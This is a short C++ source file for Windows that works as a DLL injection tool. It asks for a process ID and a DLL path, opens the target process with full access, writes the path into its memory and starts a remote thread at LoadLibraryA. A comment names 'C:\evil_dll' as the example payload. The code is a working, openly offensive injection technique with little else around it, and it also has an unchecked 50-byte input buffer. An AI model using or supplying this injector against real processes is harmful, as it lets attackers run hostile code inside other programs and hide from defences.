#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

using namespace std;
#define DLL_TO_INJECT "C:\\evil_dll" // an example of a dll to inject

void InjectDLL(DWORD ProcessID, LPCSTR DLL_PATH);

int main(int argc, char* argv[])
{
	char DLL_PATH[50] = { 0 };
	DWORD ProcessID;
	printf("Enter -1 to exit\nPress any other key to continue\n\n");
	static int input;

	while (input != -1)
	{
		// Getting PID
		printf("Enter Process ID:\n");
		cin >> ProcessID;

		// Getting DLL path
		printf("Enter DLL path:\n");
		cin >> DLL_PATH;

		// Injecting the DLL
		InjectDLL((DWORD)ProcessID, (LPCSTR)DLL_PATH);
		cin >> input;
	}
	return 0;
}

void InjectDLL(DWORD ProcessID, LPCSTR DLL_PATH)
{
	LPVOID llAddress; // process address
	HANDLE hProcess; // handle to process

	// Getting the 'LoadLibrary' function adress within kernel32.dll
	if (!(llAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"))) {
		printf("Error: cant get procAddr %d\n", GetLastError());
	}

        // Getting the handle to the injected remote process
	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID))) {
		printf("Error cant open Process! (%d)\n", GetLastError());
	}

	// Alocating memory for the DLL
	LPVOID lpDllAddress = VirtualAllocEx(hProcess, NULL, strlen(DLL_PATH) + 1, MEM_COMMIT, PAGE_READWRITE);
	size_t nBytesWritten;

	// Writing memory buffer into the remote process
	if (!WriteProcessMemory(hProcess, lpDllAddress, DLL_PATH, strlen(DLL_PATH) + 1, &nBytesWritten) || nBytesWritten == 0)
	{
		printf("Error: WriteProcessMemory! (%d)\n", GetLastError());
	}
	
	// Creating Remote Thread to run the DLL
	else
	{
		HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)llAddress, lpDllAddress, NULL, NULL);
		if (!hThread)
			printf("Error: CreateRemoteThread! (%d)\n", GetLastError());
		else
			CloseHandle(hThread);
	}
	printf("Done!\n");
}
